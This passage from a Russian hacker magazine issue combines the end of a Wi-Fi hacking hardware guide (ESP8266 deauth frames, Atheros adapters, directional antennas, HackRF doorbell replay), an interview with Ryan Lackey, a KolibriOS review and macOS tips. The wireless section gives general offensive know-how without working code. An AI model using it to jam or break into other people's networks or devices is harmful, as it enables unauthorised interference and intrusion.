С модой на IoT распространение получил кро хотный бес провод ной контрол‐
лер ESP8266, а хакеров ста ла прес ледовать мысль про рубить на нем монито‐
ринговый режим. И в итоге это го удалось добиться! Но к сожале нию, пол‐
ноценный мониторинг и инъекция пакетов на этом чипе невоз можны в силу
хардварных ограниче ний на раз мер буфера в 128 байт. Такого буфера,
конечно же, не хватит на полноценную лов лю хендшейков. Однако его впол не
достаточно для отправ ки deauth‐фреймов. Коллекцию разного рода про ектов
для ESP8266 (в том чис ле и для deauth) я собрал на сво ем GitHub. Так же хочу
обратить твое внимание на проект по Wi‐Fi‐позици они рованию на осно ве ES‐
P8266.





КАКИЕ ЕЩЕ МИКРОКОНТРОЛЛЕРЫ МОЖНО ИСПОЛЬЗОВАТЬ?
Ре жим монито ра доступен на Ti CC3200 в рам ках их фирменной тех нологии
RFSniﬀer. Надо ска зать, что возможность мониторин га на чипах серии Chip‐
con фир мы Texas Instruments уже привела к появлению таких продук тов,
как Yardstick/RFCat и Ubertooth. Они предназначены для хакинга ISM и Blue‐
tooth соответствен но. Насколько реально на практике исполь зовать  Ti
CC3200? Задав шись этим воп росом, я купил дев боард, но руки до него пока
не дошли. Воз можно, когда это случится, у меня появится тема для инте рес‐
ной статьи в «Хакер»!


ЧТО В ИТОГЕ ЛУЧШЕ ВСЕГО ПРИОБРЕСТИ НАЧИНАЮЩЕМУ?
Ес ли  нуж но  с  чего‐то  начать,  то  дос таточ но  взять  TP‐Link WN722N.
Это рабочая лошадка, которая в будущем не раз при годится, — можно цеп‐
лять и к ноутбуку, и к планшету, и к роутеру. Есть целый класс атак, которые
можно реали зовать толь ко с чипом Atheros, — это разного рода кастомные
и advanced‐ата ки.
  Ро утер же хорош тогда, когда стоит задача запустить сканиро вание и уйти
надолго. Если часто приходится работать в полевых условиях, то можешь,
как и я, взять GL‐MiFi — он к тому же пригодится не толь ко для хакинга, но и
для более мир ных целей типа раздачи мобильного интерне та.


КАКИЕ БЫВАЮТ АНТЕННЫ?
Осо бым пунктом в списке железа стоит антенна, а точ нее антенны. Фор ма
антенны воплощает в себе матема тичес кие рас четы и поэтому во мно гих слу‐
чаях даже патентуется (китайцы, конечно же, в кур се и, как обычно, при бегают
к пиратству).
  Существует несколько основных видов антенн, и каждый из них хорош
для раз ных задач. По диаг рамме направлен ности их делят:
 • на всенап равленные (штыревые, дипольные);
 • нап равленные (вол новой канал, Uda Yagi);
 • час тично направленные (панельные, секторные, тарел ки).

Наибо лее универ сальна, конечно же, штыревая антенна, которая и торчит
из боль шинства домаш них роутеров.





Как ты можешь заметить, в антенне есть завитки, и это неспроста. Wi‐Fi‐сиг‐
нал излучается именно в плос кости витков. Поэтому следует быть вниматель‐
ным при установке Wi‐Fi‐роутера дома, а точ нее ориентации плос кости его
антенн так, что бы не раз давать в сторону соседей сверху и снизу — им это не
при годит ся. Под робнее об этом искусстве читай в статье «Wi‐Fi по мак‐
симуму. Как улучшить качес тво свя зи без дополнительных затрат».


КАКУЮ АНТЕННУ В ИТОГЕ БРАТЬ?
Шты ревая, всенап равленная антенна хороша, ког да надо работать в режиме
точки дос тупа — раз давать интернет. Когда нас интересует взлом опре‐
деленной точки дос тупа, то используются направленные антенны. Две мои
основные антенны — штыревая для раздачи интернета и направленная
антенна с боль шим отражателем.





КАК ЗАКРЕПИТЬ АНТЕННУ?
Так как нап равленную антенну нужно жес тко фиксировать, то возникает воп‐
рос, с помощью чего это мож но сделать. Я рекомендую использовать штатив
от фотоаппарата или телескопа. Пос кольку шта тив у меня всего один,
советов по выбору марки и модели я дать не могу. Мой был куплен по прин‐
ципу «максимум степеней свободы за приемлемые деньги». Ну и конечно,
обращай внимание на вес, который может выдержать штатив, и качество его
сборки.
  Предел мечтаний — это штатив для телес копа, меняющий направле ние
сам при помощи команд через USB или COM‐порт. Однако стоят такие
малют ки недеше во. Зато с ними мож но говорить о сканиро вании не толь ко
эфира, но и местнос ти. :‐)


С ЧЕМ ЕЩЕ МОЖНО ПОИГРАТЬСЯ?
Еще три года назад мы с Глебом Чер бовым в ночи ломали беспро водной зво‐
нок, что бы поз накомить читателей журнала «Хакер» с одним из первых Hack‐
RF (Jawbreaker) на территории РФ. 433 ГГц и простой sniﬀ & replay поз волял (и
позволя ет) зазвонить соседей до смерти. Прош ло не так много вре мени,
и мы уже читаем в новостях от личные исто рии про взлом звон ков по Wi‐Fi.
  Да что там звонки! Сей час и япон ские вне дорожники от кры ваются по Wi‐Fi.
И то ли еще будет! Сей час точками дос тупа снаб жает ся 90% новых авто моби‐
лей. Про банальные роутеры, принтеры, камеры и про чий IoT как‐то уже
и говорить не хочет ся. Ну а если вдруг потянет на что‐нибудь новенькое, то
тебя ждут nRF24 и NFC. В общем, скучать не при дется!
COVERSTORY





Дмитрий Чумаченко
   dichum@mail.ru





ИНТЕРВЬЮ С РАЙАНОМ ЛЭКИ
ОБ ИНФОСЕК‐СТАРТАПАХ, CLOUDFLARE И МНОГОМ ДРУГОМ




Да та‐центр на заброшенной неф тяной вышке близ берегов
Англии, независимые сервисы связи в Ира ке и Афганистане,
стартап в легендарном Y Combinator, работа в Cloudﬂare —
от одно го толь ко послужно го спис ка Райана Лэки веет духом
сво боды, хакерс твом и здо ровым аван тюризмом.


Биография
Райан Лэки, также извес тный как octal, начал интересоваться компьютерной
безопасностью еще в конце 1980‐х годов. Получив свой первый компьютер
и используя откры тый dial‐in местного университета для доступа в интернет,
он обнаружил форумы, где обсуждалась безопас ность USENET, затем IRC
и знаменитый спи сок рассылки cypherpunks. Там он понял, что познания
в математике и хороший набор софта позволяют человеку (даже подростку!)
про тивостоять большим организа циям и даже правительству.
   Через несколько лет пос ле поступления в MIT он ушел отту да, чтобы осно‐
 вать ано нимную электронную кассовую ком панию на карибском острове
 Ангилья. Местные власти выгнали его и прик рыли биз нес, но Лэки начал
работать со сво ими бывшими соседя ми с Ангильи, чтобы создать офшорную
ком панию HavenCo в самоп ровозглашенном Княжестве Силенд в Северном
море. Это был так называемый data haven — место, где каждый мог раз‐
местить свой сервер и быть защищен ным  от претензий со  стороны
 каких‐либо властей.
   Позже Рай ан Лэки строил спутниковые, сотовые и беспро водные сети
в зонах конфликтов (Ирак и Афганистан). Вернувшись в США в 2011 году, он
основал в Y Combinator стартап CryptoSeal, который использовал новейшие
 тех нологии безопас ности  Intel для удален ной аттестации и построения
доверенных облачных сервисов, таких как приложения SaaS и VPN. Эта ком‐
пания была про дана Cloudﬂare в 2014 году, где Лэки проработал в качес тве
менеджера по продук там безопас ности до 2016 года.
  В 2016 году Рай ан Лэки основал новый стар тап, ResetSecurity, который
строит безопасные вычислительные плат формы для пользовате лей и сред
с высоким уровнем риска, например для корпоративных путешественников.




                      23 сен тября 2017 года Райан Лэки выступит
                       на треть ем международном форуме по кибер‐
                       безопасности HackIT‐2017 в Харькове с докладом
                             «Взло май, создай, продай, или как хакеры могут
                       достичь успеха в мире бизнеса».



  — Каким был ваш первый про ект после MIT? Что это была
за компания с элек трон ными деньгами и почему правительство
Кариб ско го бассейна ставило вам пал ки в колеса?
  — Я ушел из MIT, что бы работать над анонимной электронной системой
наличных денег. Учредители платежной системы E‐Gold предложили мне
финансирование, чтобы я и еще один специалист по безопасности соз дали
ано ним ную платежную систему на основе E‐Gold. Мы достигли хороших
результатов в течение года, но территориально были расположены на кариб‐
ском острове Ангилья, и в результате это стало проблемой. Правитель ство
сильно пре пятс твовало получению виз и раз решения на работу, поэтому
в ито ге мы ушли.




                        E‐Gold — это прак тически Bitcoin эпохи бума дот‐
                        комов. В отличие от современных криптовалют
                       она работа ла через централизо ванный сервер
                      и про валилась из‐за юридических сложностей.



  — В начале 2000-х годов вы были вовлечены в про ект HavenCo,
первый в мире  data  haven. Какова была кон цепция про екта
и пред посыл ки его соз дания?
  — Его идея зак лючалась в том, что бы обеспечить место для надежного
раз мещения серверов — сво бодных как от цензуры, так и от под делок —
в мире, который еще не определился с тем, нас колько свободным будет
 интернет. В то вре мя во многих стра нах было гораз до более запутанное
или карательное интернет‐законодательство, чем сегодня, а инфраструктура,
необходимая для размещения даже небольшого веб‐сайта, была гораз до
более существенной. Тре бовалось боль шое количес тво дорогос тоящих сер‐
 веров. Мои сторонники и я полагали, что благоп рият ное место для хранения
данных позволит проц ветать свободе слова и торговле.
  — Ваша компания HavenCo была осно вана в непризнан ном
государстве  Силенд  у  берегов  Великоб ритании.  Расскажите
об этом месте. Почему выб рали имен но его?
  — Мы под бирали место с подходящи ми законами для размещения data
 haven. К сожалению, ни в одной стране в то вре мя не было достаточно
хороших законов, поэто му пришлось искать другие вари анты. Мы обнаружили
Силенд благодаря книге «Как начать собствен ную страну» и написали авто‐
рам по электронной почте. Хотя стра на была непризнанной, де‐фак то
 это незави симое государство. Для наших целей этого было дос таточ но.
  — Вы появились на обложке журнала Wired, это в ИТ‑сооб щес-
тве серьезный знак приз нания. Что вы чувство вали в тот момент?
  — Запуск HavenCo был очень затратным по вре мени и силам. От согласия
на статью до ее выхода прошло больше шести месяцев, поэтому мы были
немного удив лены, когда наконец увидели ее. В то время я был очень
уставшим и нап ряженным.
  — Почему вы ушли из HavenCo?
  — По сути, у нас кон чились день ги. Пузырь дот комов двухтысячного года
при вел к падению всех цен, а наши зат раты были очень высокими: до этого
цены сос тавляли около 3000 долларов за мегабит в секунду, а после кру‐
шения упали до 20–50 долларов, в то время как наши расходы оста вались
пос тоянными — около 500 долларов за мегабит в секунду. Денег не хватало,
и нам пришлось взять владельцев Силенда в качестве деловых пар тне ров,
а они оказались гораздо более кон сервативными, чем мы. Они отказались
пре дос тавить нам усло вия, которые позволили бы получать прибыль, поэтому
 я ушел.
  — После того как вы покину ли Силенд, про шел слух о переме-
щении туда серверов Wikileaks. Считаете ли вы этот вариант воз-
можным? Каковы перспек тивы Силен да как цен тра обработки
дан ных?
  — Я не думаю, что сейчас у Силен да есть какая‐то особая ценность
в качестве хос тинга. Для статических дан ных такие вещи, как BitTorrent и дру‐
 гие децентрализо ванные крип тографические системы совмес тного дос тупа
 к фай лам (IPFS, Filecoin и про чие), в значительной степени устраняют необ‐
ходимость физического хранения данных. Законы в странах по всему миру
тоже стали нам ного более благоп риятными. Вир туализация позволяет запус‐
 тить хостинг при помощи VPS‐ или IAAS‐провай деров, например Amazon.
Для это го нужна только кредитка, а если забанят, то всегда можно завести
новую учетку. Очень нем ногие услуги по‐прежнему нуждаются в data haven.
  — Дру гим вашим про ектом был BlueIraq, который обслу живал
министерство обо роны и внутренние рын ки в Ираке и Афганис-
тане во вре мя кон флик та с США. Расскажите о биз нес‑модели
компании.
  — В Ираке я запустил спутник, интернет и беспроводную сотовую ком‐
панию с 2004 по 2009 годы. В начале у меня на все про все было две тысячи
долларов, но я про дал услуги разным аме риканским и иракским правитель‐
ственным учрежде ниям, отдельным воинским  частям, компаниям, НПО
и интернет‐кафе. Мы использовали тер миналы VSAT для обеспечения связи
с Европой, без цензуры и с высокой ско ростью. Оборудование в перес чете
на каждого клиента обходилось в несколько тысяч долларов.
  — Как правительство США отре агировало на вашу деятельность
в BlueIraq?
  — Правительство США было нашим клиентом, и им все очень нравилось.
Иногда это, конечно, приводило к путанице, потому что они не успе ли при‐
думать правила, по которым мож но было бы работать, но, поскольку мы пре‐
доставляли ценную услугу, нам помога ли и раз решали работать на американ‐
 ских базах. С тех пор у меня осталось мно жес тво дру зей, которые тогда слу‐
жили в армии и работа ли в правитель стве, и я был рад, что могу помочь им, —
 хотя миссия в Ираке была непростой, люди там зас лужили поддержку.
  — Почему BlueIraq прек ратил свою деятельность?
  — По совокуп ности факторов. Я не мог нанять хороших управленцев,
и мне ста ло скуч но жить в Ираке. В какой‐то момент совокупный риск сум‐
мируется, и просто не имеет смысла про дол жать. Я разорвал контрак ты
и вернулся в США.
  — В 2010 году вы осно вали CryptoSeal, компанию по соз данию
криптографического обо рудо вания,  программно го обеспечения
и сетевых сервисов. Расскажите под робнее об этом стартапе.
  — CryptoSeal исполь зовала процессор Intel и технологии безопасности
на уровне плат формы (TCG TPM, Intel TXT и в конечном счете Intel SGX)
для соз дания защищенной инфраструк туры облачных вычислений для поль‐
зователей. Идея заключалась в том, что, создав безопасный движок вир‐
 туальной машины, мы мог ли бы удаленно доказать конечным пользователям,
 что программное обеспечение работает в облаке и что пользователи могут
доверять этому ПО. Затем мы раз работа ли ряд приложений, в том числе
службу VPN, используя эту технологию.
  — Как CryptoSeal попал в Y Combinator и какой опыт это вам
дало?
  — Тогда, в 2011 году, подать заяв ку в Y Combinator было относительно
прос то. Я встре тился с некоторыми выпускниками Y Combinator в Сан‐Фран‐
 циско, поговорил с ними об их и моем стартапах, подал заявку, а затем,
 как только получил запланированное собеседова ние, встре тился с осно вате‐
лями Y Combinator, чтобы узнать их мнение о том, как я должен презен товать
свой проект. У нас было стандартное для Y Combinator десятиминутное
интервью, все прошло хорошо, и по его ито гам мы попали в инкубатор.
   Y Combinator мне очень понравился. Осно ватели пришли туда из самых
раз ных ком паний, у них был разный опыт и мотива ция, но мы раз деляли нес‐
 колько общих интересов: создание продуктов, которые бы нравились людям,
и создание компании, которая бы работала над этими продуктами. Я близко
под ружился с некото рыми участниками инку бато ра и вынес мно го полезного
из обще ния с ними. Иног да я помогал некоторым из них с проблемами
безопасности и инфраструктуры, так что это были взаимо выгодные отно‐
шения.
  — В 2014 году Cloudflare приобре ла CryptoSeal. Что дала эта
сдел ка обе им компаниям?
  — Cloudﬂare купила акти вы CryptoSeal, и я работал в Cloudﬂare в течение
следующих  двух  лет  в  качес тве менеджера по продуктам,  свя занным
с безопасностью. Я мно го узнал о самой компании, о биз несе ее клиентов,
а также о проблемах отражения DDoS и веб‐угроз.
   Что мне очень пон равилось в Cloudﬂare — это четкая политика сво боды
слова, прод вига емая основателями и поддерживаемая все вре мя. В Cloud‐
 ﬂare готовы пре доставлять сервисы безопас ности прак тичес ки для любого
законного сайта; здесь не занимаются цен зурой, осно ванной на собственной
полити ческой позиции.
  — После последней утеч ки дан ных Cloudflare в феврале это го
года  вы  сказали,  что  Cloudflare  стал  критически  важ ным
для интерне та. Как мы можем защитить себя от таких инциден-
тов?
  — Я и прав да считаю, что Cloudﬂare очень важен для безопас ности
интернета, и это на самом деле хорошо. Потому что в этой компании при‐
 лагают боль шие уси лия к тому, чтобы сде лать интернет безопас нее, и к тому,
 чтобы облегчить сам этот процесс обеспечения безопасности. Проблема
с Cloudﬂare (Cloudbleed) была серь езной, но, к счастью, не пов лекла больших
пос ледствий.
  Лю ди сей час часто отда ют свою безопас ность на аутсорсинг круп ным
ком пани ям: если вы размещены на AWS, безопасность Amazon имеет для вас
решающее значение, если вы используете хос тинг‐провай дер почты Gmail,
безопасность Google имеет для вас решающее зна чение. Для многих людей
 это рациональный выбор, так как эти компании дела ют хорошую работу и рас‐
полага ют ресурсами, в обеспечении безопас ности превышающими воз‐
можнос ти отдельных лиц или небольших компаний.
  — В прош лом году вы пред ставили обществен ности новый про-
ект, Security Startup #5. Что это такое? Какие цели вы преследу-
ете? Что ожидаете от про екта?
  — В осно ве моего стартапа — идея создания безопасных ноутбуков
и мобильных устрой ств для людей и орга низаций, которые подвергаются экс‐
тремальному риску, и, в час тности, для облегче ния международных поез док
в районы с высоким уровнем риска или лицам, которые подвергнуты боль‐
шому риску.
  — Я знаю, что вам небез различ на политика Трампа по про вер-
ке частных дан ных на границе США. Не могли бы вы про ком-
ментировать эту проб лему?
  — В конеч ном сче те страны имеют право охра нять свои гра ницы, удер‐
живая нежелательных и опасных лиц и предметы вне страны. Это открытый
вопрос, и важную роль в его решении будут играть облачные данные. В то
вре мя как законом проз рачно прописан пог раничный досмотр для про верки
содержимого компьютер ных устройств, мы не зна ем, какой законодательный
 ста тус име ют аккаунты, доступные с это го устройства, такие как уда ленный
почтовый ящик или сер вер соци альных сетей.
  — Что вы можете посове товать путешествен никам, которые
хотят защитить свои дан ные?
  — Лучший совет путешественникам, которые хотят защитить данные,
находясь в сре де высокого риска, — это не брать с собой ничего, что они
не желают раскрывать. Если вы отправляетесь в отпуск, нет оснований брать
с собой все исходные коды вашей компании.
  —  Каковы ваши  про фессиональные  планы  на  ближайшее
будущее?
  — Я работаю полный рабочий день в моем стартапе, а также путешествую
по конференциям по всему миру.
  — Посове туйте одну книгу и один фильм нашим читате лям.
  — Я большой фанат научной фан тастики. Из корот ких рас сказов мой
любимый — это «Истинные имена» Вернора Вин джа. Из романов хороши
«Демон» и «Свобода» Дэниела Суаре са. Еще трилогия «Задача трех тел» Лю
Цысиня великолепна. Я смотрю мало фильмов и сери алов, но слышал, что
«Игра прес толов» хороша, а из фильмов советуют «Прибытие».
PCZONE





                Андрей Васильков
                 редактор, фронемофил, гик,
                               к. м. н. и т. п.
                    angstroem@hotbox.ru


НА ЧТО СПОСОБНА ОС,
ЦЕЛИКОМ НАПИСАННАЯ
НА АССЕМБЛЕРЕ




Сегодня в нашей кунс ткамере любопыт ный образчик — опе‐
рационная система, написан ная на чис том ассемблере.
Вмес те с драй верами, графичес кой обо лочкой, десятками
предустановленных прог рамм и игр она занима ет меньше
полуто ра мегабайт. Зна комься — исключительно быстрая
и пре имущественно российская ОС «Колибри».


Развитие «Колибри» шло довольно быстро вплоть до 2009 года. Птич ка
научилась летать на раз ном железе, минималь но требуя первый «Пентиум»
и восемь мегабайт опе ративной памяти. Минималь ные системные тре бова‐
ния «Колиб ри» таковы:
 • ЦП: Pentium, AMD 5x86 или Cyrix 5x86 без MMX с час тотой 100 МГц;
 • ОЗУ: 8 Мбайт;
 • видеокар та: VESA‐совместимая с поддержкой режима VGA (640 × 480 ×
   16).

Сов ременная «Колиб ри» — это регулярно обновляемые «ночные сборки»
пос ледней официальной версии, вышедшей в кон це 2009 года. Мы тес‐
тировали билд 0.7.7.0+ от 20 августа 2017 года.




                   В настройках по умол чанию у KolibriOS отсутс тву‐
                         ет доступ к дискам, которые видны через BIOS.
                     Хорошенько подумай и сделай бэкап, преж де чем
                       менять эту настройку.


Из менения в ноч ных сборках хоть и невелики, но за годы их накопилось дос‐
таточно. Обновленная «Колибри» может писать на раз делы FAT 16–32 / ext2 —
ext 4 и под держивает дру гие популярные фай ловые системы (NTFS, XFS, ISO‐
9660) в режиме чтения. В ней появи лась поддержка USB и сетевых карт, был
добавлен стек TCP/IP и зву ковые кодеки. В общем, в ней уже можно что‐то
делать, а не прос то пос мотреть разок на сверхлег кую операци онку с GUI
и впе чат литься скоростью запуска.





                              KolibriOS X‐edition

Как и предшес твующие версии, пос ледняя «Колиб ри» написана на ﬂat assem‐
bler (FASM) и занима ет одну дискету — 1,44 Мбайт. Благодаря этому ее мож‐
но целиком разместить в какой‐нибудь специализированной памяти. Нап‐
ример, умельцы записали KolibriOS прямо во Flash BIOS. Во время работы
она может целиком раз мещаться в кеше некоторых процессоров. Только
представь: вся операционка вместе с программа ми и драй верами кеширо‐
вана!




                    При посещении сайта kolibrios.org браузер может
                      предуп редить  об  опасности.  Причина,  судя
                      по всему, — это ассемблерные программы в дис‐
                       три бутиве. Сейчас  VirusTotal определяет  сайт
                         как совер шенно безопасный.


«Колиб ри» легко загружается с дис кеты, вин честера, флешки, Live CD или в
виртуальной машине. Для эму ляции дос таточно указать тип ОС «другая»,
выделить ей одно ядро процессора и немного опе ративки. Диск под ключать
необязательно, а при наличии роутера с DHCP «Колиб ри» моментально под‐
ключится к интерне ту и локальной сети. Сразу при загрузке ты увидишь соот‐
ветствующее уве домление.





                  Мгновенное подключение к сети

Одна  проблема —  протокол HTTPS  не  под держивается  встроенным
в «Колибри» браузе ром. Поэто му сайт Xakep.ru посмотреть в ней не удалось,
так же как открыть страницы Google, Yandex, Wikipedia, «Сбербанка»... собс‐
твен но, никакой привыч ный адрес. Все давно перешли на защищенный про‐
токол. Единствен ный сайт с олдскуль ным чис тым HTTP, который мне попал‐
ся, — это «портал Правительства России», но и он выглядел в текстовом бра‐
узере не луч шим образом.





                Тексто вый браузер работа ет только с HTTP

Настройки внеш него вида в «Колиб ри» с годами  улучшаются, но все
еще далеки от иде ала. Спи сок поддержи ваемых виде орежимов отобража‐
ется на экране заг рузки «Колибри» при нажатии кла виши с латинской буквой
a.





                    Выбор разрешения

Пе речень дос тупных вари антов невелик, и нужного раз решения в нем может
не оказаться. Если у тебя видеокарта с ГП AMD  (ATI), то можно сразу
добавить кастомные нас тройки. Для этого нуж но загрузчику ATIKMS передать
параметр ‐m<width>x<height>x<refresh>, нап ример:


/RD/1/DRIVERS/ATIKMS ‐m1280x800x60 ‐1

Здесь /RD/1/DRIVERS/ATIKMS — это путь до загрузчика (RD — RAM Disk).
  При работе системы выбранный видеорежим мож но пос мотреть коман дой
vmode и (теоретически) переключать вручную. Если «Колибри» запущена
в виртуалке, то это окно останет ся пустым, а вот при чистой загрузке драй‐
веры видео Intel можно добавить от i915 до Skylake включительно.
   Удивительно, но в KolibriOS уместилась куча игр. Сре ди них есть логичес‐
кие и аркадные, пятнашки, змейка, танки (нет, не WoT) — целый «Игровой
центр»! На «Колиб ри» портировали даже Doom и Quake.





                          Иг ровой центр

Еще из важ ного нашлась читалка FB2READ. Она корректно работает с кирил‐
лицей и име ет настройки отоб ражения текста.





                   Самая лег кая читалка FB2

Все поль зовательские файлы рекомен дую хра нить на флешке, но под ключать
ее нужно обязательно через порт USB 2.0. Наша флешка USB 3.0 (в порте
USB 2.0) объемом 16 Гбайт с фай ловой системой NTFS опре делилась сразу.
Если нужно записывать файлы, то стоит подклю чить флешку с раз делом FAT‐
32.





                      Под клю чаем флеш ку

В дистрибутив «Колибри» входит три файловых менеджера, утилиты для прос‐
мотра изоб ражений и документов, аудио‐ и видеоплееры и прочие поль‐
зовательские приложе ния. Однако основное внимание в ней уде лено раз‐
работ ке на ассем бле ре.





                     Средства разработчика

Встроенный тексто вый редактор имеет подсветку ASM‐синтаксиса и даже
позволя ет сразу запускать наб ранные программы.





                Запуск программы прямо из TinyPad

Сре ди средств раз работки есть компилятор Oberon‐07/11 для i386 Windows,
Linux и KolibriOS, а так же низкоуровневые эму лято ры: E80 — эмулятор ZX
Spectrum, FCE Ultra — один из лучших эмуляторов NES, DOSBox v.0.74 и дру‐
гие. Все они были специально пор тированы на «Колиб ри».
   Если оставить KolibriOS на нес коль ко минут, то запустится скринсейвер.
На экране побегут строки кода, в которых можно уви деть отсылку к MenuetOS.





                  Не пугайся, это скринсейвер!


КАК ПОЯВИЛАСЬ KOLIBRIOS
Интересна и сама идея появ ления «Колиб ри». Это не оче редной клон Linux,
а  совершенно  уни каль ная  разработка.  Единственное,  что  род нит  ее
с Linux, — это открытый исходный код и финские кор ни.
  Мно гие из авто ров «Колиб ри» до это го работа ли в другом проекте —
MenuetOS, из которой и вырос ла эта птич ка. Они заметили, что у всех опе‐
раци онок есть общая проблема — дико раз дутое и уже потому ненадежное
ядро. Еще в начале нулевых об этом писал Брюс Шнай ер в книге «Секреты
и ложь. Безопасность данных в цифровом мире». Тогда ему казалось, что
у популярных в то время ОС — всевоз можных клонов UNIX, Windows NT
4.0 и следующей за ней Windows 2000 (NT 5.0) — все очень плохо с безопас‐
ностью именно из‐за огромного ядра.



      «Когда сис тема UNIX была написа на впер вые, считалось обязатель-
     ным помещение несущес твенных кодов за пре дела ми ядра. <...> Все
     име ющиеся сейчас раз новид ности UNIX в той или иной сте пени стра-
      дают рас пуханием ядра: у них либо слиш ком много команд в ядре,
      либо име ются непонятные утилиты, запус кающиеся в слу чае кор-
      невого дос тупа, либо что‑то еще.
      Windows NT устроена нам ного хуже. Эта опе рационная сис тема может
      слу жить примером того, как полностью игнориру ются историчес кие
      уроки безопас ности. <...> Windows, похоже, придер жива ется мне ния,
       что, пос кольку то, что содер жится в ядре, защищено по опре деле нию,
      сле дует прос то побольше все го раз местить прямо в ядре. Если раз-
      работчикам было непонятно, как обес печить безопас ность чего‑либо,
      они прос то запихивали это в ядро и считали его уже защищенным.
       <...>
       <...> ...Философия Windows NT в том, чтобы всегда отда вать пред-
      почте ние прос тому над безопас ным — и в обра щении, и в раз работ-
       ке», — писал Шнайер в 2000 году. Не сказать, что его книга ста ла
      откровением, но в ней были сфор мулированы те идеи, которые дав но
      витали в воз духе.

При мерно тогда же груп па программис тов из Фин ляндии, Польши и стран
бывшего СССР предприняла попытку соз дать прин ципиально новую опе‐
раци онку. Написать ее почти с нуля и сделать как можно ком пактнее — в иде‐
але, что бы она помещалась на дискету (флешек в те вре мена еще не было,
и даже пишущий CD‐привод казался дикови ной).
   Этой системой была MenuetOS. Идейным вдохновите лем выступил Вил ле
Микаэль Турьянмаа. Когда‐то он работал с MrOS — графической многоза‐
дачной обо лочкой для DOS, со временем выросшей в отдельную операци‐
онку. Идеи MrOS легли в основу «Менуэта».
  Понача лу MenuetOS развивалась такими же малыми шажками, какие были
характерны для французско го тан ца, в честь которого она названа. Перелом
нас тупил в 2001 году, когда на сайте OSNews было опубликовано интервью
с раз работ чиком. Вскоре к проекту при соеди нились дру гие программис ты,
а пос ле портирования FASM дальнейший код можно было компилировать
прямо в MenuetOS.
  Позже состав команды разработчиков постоян но менялся. Оче редные
раз ногласия привели к тому, что в 2003 году отде лившаяся группа решила
сде лать свой форк. Во время разработки он называл ся MENUETOS RE, но на
эта пе релиза был переименован в Kolibri 0.1.0.0. Наз вание было предложено
Станиславом «VaStaNi» Валыйских. По замыслу оно должно отра жать лег‐
ковесность и ско рость работы опе рационки. Официально «Колиб ри» вышла
в мае 2004 года. Пол ноценным форком считается KolibriOS 0.50 — именно
в ней более половины кода отли чалось от MenuetOS.


НАСТОЯЩЕЕ И БУДУЩЕЕ МАЛЕНЬКОЙ ПТИЧКИ
Сей час «Колибри» распространяется на усло виях GPLv2, в то время как ее
предшественница MenuetOS ста ла проприетар ной в 64‐бит ной версии.
  Помимо базового дистри бутива KolibriOS, сущес твует и расширенная вер‐
сия. В ней доступна ути лита уста новки драйверов DrvInst и другие допол‐
нительные ком понен ты. DrvInst позволя ет установить драй веры устройств,
отсутс твующие в образе IMG. Нап ример, драйвер SATA с поддержкой AHCI,
драйвер видео для процессоров Intel, виде окарт AMD и виртуалки VMware.
  Постепенно в «Колиб ри» появляется расширенный набор шрифтов и фун‐
кция их сглаживания. Это будет нелиш ним, поскольку встроенный набор был
оптимизи рован для старых экра нов с невысо ким разрешением.




                       «Колибри» уже вош ла в исто рию науки и кибер‐
                         панка. Сот рудники Колумбий ского универ ситета
                      и Нью‐Йоркско го  геном ного центра  за писали
                        в ДНК операционную систему  KolibriOS (PDF)
                      вместе  с  другими  дан ными  общим  объ‐
                    емом 2342 Кбайт.


Основное назначение KolibriOS оста лось преж ним — программирование
на ассем бле ре в чистой среде безо вся ких програм мных прослоек. Однако
раз работ чик может писать свой код для KolibriOS и на язы ках высокого уров‐
ня (С/С++, Modula, Fort, Pascal). Это куда более простой способ соз давать
библиотеки, драйверы и программы.




                     •Скачать образ KolibriOS
                       •Группа «Колибри» в VK
                    •Проект KolibriN
PCZONE





                                                                        Андрей Письменный
                                                                                   Шеф‐редактор
                                                                                     apismenny@gmail.com





  МЕНЯЕМ СКРЫТЫЕ НАСТРОЙКИ, СТАВИМ
    ПОЛЕЗНЫЙ СОФТ И ЛЕЗЕМ ПОД КАПОТ
           СИСТЕМЫ, ПЕРЕЙДЯ НА «МАК»





Уверен, ты не раз слышал, что в Apple всё решают за поль‐
зователя и в macOS ничего нельзя толком настроить. Пер‐
вое утвержде ние верно, а вот второе, на мой взгляд, полный
бред. В macOS тысячи настро ек — как доступных, так
и скрытых, а если в системе чего‐то не хватает, то наверняка
кто‐нибудь уже написал хорошую прог рамму для решения
проблемы. Я пользуюсь «макосью» уже десять лет и хочу
поделиться с тобой накоп ленным опытом.


Эта статья планиро валась как ознакомитель ный тур по системе и полез ным
при ложе ниям, предназначен ный для опытных поль зовате лей. Возможно, ты
только подумываешь перейти на «мак» или же живешь с macOS какое‐то вре‐
мя и жаждешь узнать что‐то новенькое о том, как устро ена система и как сде‐
лать ее удобнее. В любом случае этот гайд будет тебе полезен.


ТРИ БЫСТРЫХ СОВЕТА НОВИЧКАМ
1. Задай активные углы
Одна из первых настроек, которые я рекомендую опро бовать, — это
«активные углы». Открывай «Системные нас трой ки → Mission Control →
Активные углы» и как минимум двум углам экра на дай функции «Рабочий стол»
и «Окна программ». Первая раз двигает открытые окна и показы вает десктоп,
вто рая показывает окна активной программы. Mission Control — все прог‐
раммы, окна и дескто пы.





Это полезно не толь ко для быстрой навигации (окна прог раммы, в принципе,
можно переби рать и по Cmd‐` и Cmd‐Shift‐`), но и для перетас кивания. Ты
берешь файл или объект и можешь потянуть его на угол, потом выбрать дру‐
гое окно или программу. Тас кать мож но и на пап ки (они будут рас крываться
по ходу дела) и значки прог рамм в доке — если подержать на них файл, то
программа откро ется. Этот механизм называется spring loading — «на пру‐
жинах».


2. Изу чай и наз начай шоткаты
Открыв любую программу, не забывай изу чить ее меню — обычно в нем
содержится пол ный список функций и шоткаты для них. Кстати, ты можешь
задать свой шоткат для любого пункта меню в любой прог рамме. Открой
«Системные настройки → Клавиату ра → Сочетания кла виш → Сочетания кла‐
виш программ», нажми +. Теперь выбери программу, впиши наз вание пункта
меню и задай хот кей.





3. Освой сек реты кнопки Alt (Option)
Кнопка Alt, которую на «маке» принято называть Option, откроет тебе немало
занятных воз можнос тей. Вот наиболее полезные.
 • При наборе текста Alt и Alt‐Shift используют ся для ввода спецсимволов.
 • Зажав Alt и тыкая на значки в меню, ты можешь узнать допол нитель ную
  информацию. Например, кликнув с Alt на зна чок Wi‐Fi, ты можешь узнать
   свои MAC и IP, IP маршрутизатора, характерис тики сигнала и мно гое дру‐
   гое. А с Cmd мож но двигать значки!
 • Клик правой кнопкой мыши по знач ку прог раммы в доке с зажатым Alt
   изменит пун кты контекстно го меню. «Закрыть принудительно» вмес то
